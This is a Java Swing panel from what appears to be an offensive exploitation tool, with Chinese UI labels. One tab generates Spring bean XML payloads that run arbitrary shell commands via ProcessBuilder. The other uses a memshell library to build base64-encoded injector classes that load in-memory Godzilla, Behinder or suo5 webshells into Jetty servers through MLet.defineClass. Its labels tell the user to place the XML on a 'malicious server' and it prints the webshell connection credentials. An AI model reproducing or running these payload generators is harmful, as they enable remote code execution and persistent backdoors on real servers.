package cc.kiiy.ui;

import com.reajason.javaweb.Server;
import com.reajason.javaweb.memshell.MemShellGenerator;
import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.*;

import javax.swing.*;
import javax.swing.border.EmptyBorder;
import javax.swing.border.TitledBorder;
import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.StringSelection;
import java.util.Base64;

public class BeanXmlPanel extends JPanel {

    private JTabbedPane tabbedPane;

    // Command Execution Components
    private JTextField commandField;
    private JComboBox<String> osComboBox;
    private JButton generatePayloadButton;
    private JButton copyButton;
    private JTextArea resultArea;

    // Memory Shell Injection Components
    private JComboBox<String> toolTypeCombo;
    private JComboBox<String> jettyVersionCombo;
    private JComboBox<String> jreVersionCombo;
    private JComboBox<String> shellTypeCombo;
    private JButton memshellGenerateButton;
    private JButton memshellCopyButton;
    private JTextArea beanXmlArea;
    private JTextArea memshellResultArea;
    private String currentConnectionInfo = "";

    public BeanXmlPanel() {
        super(new BorderLayout(10, 10));
        setBorder(new EmptyBorder(10, 10, 10, 10));
        
        tabbedPane = new JTabbedPane();
        tabbedPane.addTab("命令执行", createCmdPanel());
        tabbedPane.addTab("内存马注入", createMemshellPanel());
        
        add(tabbedPane, BorderLayout.CENTER);
        
        setupListeners();
    }

    private JPanel createCmdPanel() {
        JPanel panel = new JPanel(new BorderLayout(10, 10));

        JPanel configPanel = new JPanel(new GridBagLayout());
        configPanel.setBorder(new TitledBorder("BeanXML Payload 生成"));
        GridBagConstraints gbc = new GridBagConstraints();
        gbc.insets = new Insets(5, 5, 5, 5);
        gbc.anchor = GridBagConstraints.WEST;
        gbc.fill = GridBagConstraints.HORIZONTAL;

        JLabel osLabel = new JLabel("目标操作系统:");
        osLabel.setFont(new Font("Microsoft YaHei UI", Font.PLAIN, 14));
        gbc.gridx = 0;
        gbc.gridy = 0;
        gbc.weightx = 0;
        configPanel.add(osLabel, gbc);

        String[] osTypes = {"Linux/Mac", "Windows"};
        osComboBox = new JComboBox<>(osTypes);
        osComboBox.setFont(new Font("Microsoft YaHei UI", Font.PLAIN, 14));
        gbc.gridx = 1;
        gbc.weightx = 0.2;
        configPanel.add(osComboBox, gbc);

        JLabel cmdLabel = new JLabel("执行命令:");
        cmdLabel.setFont(new Font("Microsoft YaHei UI", Font.PLAIN, 14));
        gbc.gridx = 2;
        gbc.weightx = 0;
        configPanel.add(cmdLabel, gbc);

        commandField = new JTextField("touch /tmp/success", 40);
        commandField.setFont(new Font("Microsoft YaHei UI", Font.PLAIN, 14));
        gbc.gridx = 3;
        gbc.weightx = 0.8;
        configPanel.add(commandField, gbc);

        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.RIGHT, 5, 0));
        generatePayloadButton = new JButton("生成 XML");
        generatePayloadButton.setFont(new Font("Microsoft YaHei UI", Font.PLAIN, 14));
        buttonPanel.add(generatePayloadButton);

        copyButton = new JButton("复制到剪贴板");
        copyButton.setFont(new Font("Microsoft YaHei UI", Font.PLAIN, 14));
        buttonPanel.add(copyButton);

        gbc.gridx = 0;
        gbc.gridy = 1;
        gbc.gridwidth = 4;
        gbc.weightx = 1.0;
        gbc.fill = GridBagConstraints.NONE;
        gbc.anchor = GridBagConstraints.EAST;
        configPanel.add(buttonPanel, gbc);

        resultArea = new JTextArea(15, 50);
        resultArea.setFont(new Font("Consolas", Font.PLAIN, 13));
        resultArea.setEditable(false);

        JPanel resultPanel = new JPanel(new BorderLayout(5, 5));
        resultPanel.setBorder(new TitledBorder("生成的 BeanXML"));
        resultPanel.add(new JScrollPane(resultArea), BorderLayout.CENTER);

        panel.add(configPanel, BorderLayout.NORTH);
        panel.add(resultPanel, BorderLayout.CENTER);
        return panel;
    }

    private JPanel createMemshellPanel() {
        JPanel panel = new JPanel(new BorderLayout(10, 10));

        JPanel topPanel = new JPanel();
        topPanel.setLayout(new BoxLayout(topPanel, BoxLayout.X_AXIS));
        topPanel.setBorder(BorderFactory.createCompoundBorder(
            new TitledBorder("内存马生成配置"),
            new EmptyBorder(5, 5, 5, 5)
        ));

        topPanel.add(new JLabel("工具:"));
        topPanel.add(Box.createRigidArea(new Dimension(5, 0)));
        String[] tools = {"Godzilla", "Behinder", "suo5"};
        toolTypeCombo = new JComboBox<>(tools);
        topPanel.add(toolTypeCombo);
        topPanel.add(Box.createRigidArea(new Dimension(10, 0)));

        topPanel.add(new JLabel("Jetty:"));
        topPanel.add(Box.createRigidArea(new Dimension(5, 0)));
        String[] jettyVersions = {"6", "7+", "12"};
        jettyVersionCombo = new JComboBox<>(jettyVersions);
        jettyVersionCombo.setSelectedItem("7+");
        topPanel.add(jettyVersionCombo);
        topPanel.add(Box.createRigidArea(new Dimension(10, 0)));

        topPanel.add(new JLabel("Java:"));
        topPanel.add(Box.createRigidArea(new Dimension(5, 0)));
        String[] jreVersions = {"Java 6", "Java 8", "Java 9", "Java 11", "Java 17", "Java 21"};
        jreVersionCombo = new JComboBox<>(jreVersions);
        jreVersionCombo.setSelectedItem("Java 8");
        topPanel.add(jreVersionCombo);
        topPanel.add(Box.createRigidArea(new Dimension(10, 0)));

        topPanel.add(new JLabel("挂载:"));
        topPanel.add(Box.createRigidArea(new Dimension(5, 0)));
        String[] shellTypes = {"JAKARTA_HANDLER", "JAKARTA_LISTENER", "JAKARTA_FILTER", "JAKARTA_SERVLET"};
        shellTypeCombo = new JComboBox<>(shellTypes);
        topPanel.add(shellTypeCombo);
        
        topPanel.add(Box.createHorizontalGlue());

        memshellGenerateButton = new JButton("生成");
        topPanel.add(memshellGenerateButton);
        topPanel.add(Box.createRigidArea(new Dimension(5, 0)));

        memshellCopyButton = new JButton("复制 XML");
        topPanel.add(memshellCopyButton);

        panel.add(topPanel, BorderLayout.NORTH);

        beanXmlArea = new JTextArea();
        beanXmlArea.setFont(new Font("Microsoft YaHei UI", Font.PLAIN, 14));
        beanXmlArea.setLineWrap(true);
        beanXmlArea.setWrapStyleWord(true);
        JScrollPane beanXmlScroll = new JScrollPane(beanXmlArea);
        beanXmlScroll.setBorder(new TitledBorder("生成的 BeanXML (请复制到你的恶意服务器 poc.xml)"));

        memshellResultArea = new JTextArea();
        memshellResultArea.setFont(new Font("Microsoft YaHei UI", Font.PLAIN, 14));
        memshellResultArea.setEditable(false);
        JScrollPane resultScroll = new JScrollPane(memshellResultArea);
        resultScroll.setBorder(new TitledBorder("生成日志 & 连接信息"));

        JSplitPane splitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT, beanXmlScroll, resultScroll);
        splitPane.setDividerLocation(200);
        splitPane.setResizeWeight(0.5);
        splitPane.setContinuousLayout(true);

        panel.add(splitPane, BorderLayout.CENTER);
        return panel;
    }

    private void setupListeners() {
        generatePayloadButton.addActionListener(e -> generateXml());
        copyButton.addActionListener(e -> copyToClipboard());

        osComboBox.addActionListener(e -> {
            if (osComboBox.getSelectedIndex() == 0) {
                commandField.setText("touch /tmp/success");
            } else {
                commandField.setText("calc.exe");
            }
        });

        memshellGenerateButton.addActionListener(e -> generateMemshellXml());
        
        memshellCopyButton.addActionListener(e -> {
            String xmlContent = beanXmlArea.getText();
            if (xmlContent != null && !xmlContent.isEmpty()) {
                StringSelection stringSelection = new StringSelection(xmlContent);
                Toolkit.getDefaultToolkit().getSystemClipboard().setContents(stringSelection, null);
                JOptionPane.showMessageDialog(this, "XML 内容已成功复制到剪贴板！", "复制成功", JOptionPane.INFORMATION_MESSAGE);
            } else {
                JOptionPane.showMessageDialog(this, "没有可复制的 XML 内容，请先生成！", "提示", JOptionPane.WARNING_MESSAGE);
            }
        });
    }

    private void generateXml() {
        String command = commandField.getText().trim();
        if (command.isEmpty()) {
            JOptionPane.showMessageDialog(this, "请输入要执行的命令！");
            return;
        }

        boolean isWindows = osComboBox.getSelectedIndex() == 1;
        StringBuilder xml = new StringBuilder();
        xml.append("<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n");
        xml.append("<beans xmlns=\"http://www.springframework.org/schema/beans\"\n");
        xml.append("    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n");
        xml.append("    xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n");
        xml.append("    <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n");
        xml.append("        <constructor-arg>\n");
        xml.append("            <list>\n");

        if (isWindows) {
            xml.append("                <value>cmd.exe</value>\n");
            xml.append("                <value>/c</value>\n");
        } else {
            xml.append("                <value>bash</value>\n");
            xml.append("                <value>-c</value>\n");
        }

        xml.append("                <value><![CDATA[").append(command).append("]]></value>\n");
        xml.append("            </list>\n");
        xml.append("        </constructor-arg>\n");
        xml.append("    </bean>\n");
        xml.append("</beans>");

        resultArea.setText(xml.toString());
    }

    private void copyToClipboard() {
        String xml = resultArea.getText();
        if (xml.isEmpty()) {
            JOptionPane.showMessageDialog(this, "没有可复制的内容！");
            return;
        }

        StringSelection selection = new StringSelection(xml);
        Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
        clipboard.setContents(selection, null);
        JOptionPane.showMessageDialog(this, "已复制到剪贴板！");
    }

    private void generateMemshellXml() {
        String selectedTool = (String) toolTypeCombo.getSelectedItem();
        String selectedJettyVersion = (String) jettyVersionCombo.getSelectedItem();
        String selectedJreVersion = (String) jreVersionCombo.getSelectedItem();
        String selectedShellType = (String) shellTypeCombo.getSelectedItem();

        int targetJreVersion = 52; // Default JDK 8
        if (selectedJreVersion != null) {
            String jdkNumStr = selectedJreVersion.replace("Java ", "");
            try {
                int jdkNum = Integer.parseInt(jdkNumStr);
                targetJreVersion = 44 + jdkNum;
            } catch (Exception ignored) {
            }
        }

        String shellTool = ShellTool.Godzilla;
        ShellToolConfig toolConfig = null;
        
        switch (selectedTool) {
            case "Godzilla":
                shellTool = ShellTool.Godzilla;
                toolConfig = GodzillaConfig.builder().build();
                break;
            case "Behinder":
                shellTool = ShellTool.Behinder;
                toolConfig = BehinderConfig.builder().build();
                break;
            case "suo5":
                shellTool = ShellTool.Suo5;
                toolConfig = Suo5Config.builder().build();
                break;
            default:
                shellTool = ShellTool.Godzilla;
                toolConfig = GodzillaConfig.builder().build();
                break;
        }

        try {
            String actualShellType = ShellType.JAKARTA_HANDLER;
            if (selectedShellType != null) {
                switch (selectedShellType) {
                    case "JAKARTA_HANDLER": actualShellType = ShellType.JAKARTA_HANDLER; break;
                    case "JAKARTA_LISTENER": actualShellType = ShellType.JAKARTA_LISTENER; break;
                    case "JAKARTA_FILTER": actualShellType = ShellType.JAKARTA_FILTER; break;
                    case "JAKARTA_SERVLET": actualShellType = ShellType.JAKARTA_SERVLET; break;
                }
            }

            ShellConfig shellConfig = ShellConfig.builder()
                    .server(Server.Jetty)
                    .serverVersion(selectedJettyVersion != null ? selectedJettyVersion : "7+")
                    .targetJreVersion(targetJreVersion)
                    .shellTool(shellTool)
                    .shellType(actualShellType)
                    .shrink(true)
                    .debug(false)
                    .build();

            InjectorConfig injectorConfig = InjectorConfig.builder().build();

            MemShellResult result = MemShellGenerator.generate(shellConfig, injectorConfig, toolConfig);

            String base64Payload = result.getInjectorBytesBase64Str();
            byte[] decodedBytes = java.util.Base64.getDecoder().decode(base64Payload);
            int byteSize = decodedBytes.length;

            String xmlTemplate = "<beans\n" +
                    "    xmlns=\"http://www.springframework.org/schema/beans\"\n" +
                    "    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n" +
                    "    xsi:schemaLocation=\"http://www.springframework.org/schema/beans\n" +
                    "                        http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
                    "\n" +
                    "    <bean id=\"base64Decoder\" class=\"org.springframework.beans.factory.config.MethodInvokingFactoryBean\">\n" +
                    "        <property name=\"staticMethod\" value=\"java.util.Base64.getDecoder\"/>\n" +
                    "    </bean>\n" +
                    "\n" +
                    "    <bean id=\"decodedBytes\" class=\"org.springframework.beans.factory.config.MethodInvokingFactoryBean\">\n" +
                    "        <property name=\"targetObject\" ref=\"base64Decoder\"/>\n" +
                    "        <property name=\"targetMethod\" value=\"decode\"/>\n" +
                    "        <property name=\"arguments\">\n" +
                    "            <list>\n" +
                    "                <value>%s</value>\n" +
                    "            </list>\n" +
                    "        </property>\n" +
                    "    </bean>\n" +
                    "\n" +
                    "    <bean id=\"mlet\" class=\"javax.management.loading.MLet\"/>\n" +
                    "\n" +
                    "    <bean id=\"payloadClass\" factory-bean=\"mlet\" factory-method=\"defineClass\">\n" +
                    "        <constructor-arg value=\"%s\"/>\n" +
                    "        <constructor-arg ref=\"decodedBytes\"/>\n" +
                    "        <constructor-arg type=\"int\" value=\"0\"/>\n" +
                    "        <constructor-arg type=\"int\" value=\"%d\"/>\n" +
                    "    </bean>\n" +
                    "\n" +
                    "    <bean factory-bean=\"payloadClass\" factory-method=\"newInstance\"/>\n" +
                    "\n" +
                    "</beans>";

            String finalXml = String.format(xmlTemplate, base64Payload, result.getInjectorClassName(), byteSize);
            beanXmlArea.setText(finalXml);
            
            StringBuilder info = new StringBuilder();
            info.append("工具类型: ").append(selectedTool).append("\n");
            info.append("内存马类名: ").append(result.getShellClassName()).append("\n");
            info.append("注入器类名: ").append(result.getInjectorClassName()).append("\n");
            info.append("注入器字节大小: ").append(byteSize).append("\n\n");
            
            info.append("预期连接信息：\n");
            ShellToolConfig actualConfig = result.getShellToolConfig();
            if (selectedTool.equals("Godzilla") && actualConfig instanceof GodzillaConfig) {
                GodzillaConfig gc = (GodzillaConfig) actualConfig;
                info.append("密码: ").append(gc.getPass()).append("\n");
                info.append("密钥: ").append(gc.getKey()).append("\n");
                info.append("请求头: ").append(gc.getHeaderName()).append(": ").append(gc.getHeaderValue()).append("\n");
            } else if (selectedTool.equals("Behinder") && actualConfig instanceof BehinderConfig) {
                BehinderConfig bc = (BehinderConfig) actualConfig;
                info.append("密码: ").append(bc.getPass()).append("\n");
                info.append("请求头: ").append(bc.getHeaderName()).append(": ").append(bc.getHeaderValue()).append("\n");
            } else if (selectedTool.equals("suo5") && actualConfig instanceof Suo5Config) {
                Suo5Config sc = (Suo5Config) actualConfig;
                info.append("请求头: ").append(sc.getHeaderName()).append(": ").append(sc.getHeaderValue()).append("\n");
            } else {
                info.append("请参考对应工具的默认连接方式。\n");
            }
            
            currentConnectionInfo = info.toString();
            memshellResultArea.setText("生成完成！请将上方的 BeanXML 复制到恶意服务器的 poc.xml 中。\n\n" + currentConnectionInfo);

        } catch (Throwable ex) {
            memshellResultArea.setText("生成失败：" + ex.getMessage());
            ex.printStackTrace();
        }
    }

    public String getCurrentConnectionInfo() {
        return currentConnectionInfo;
    }
}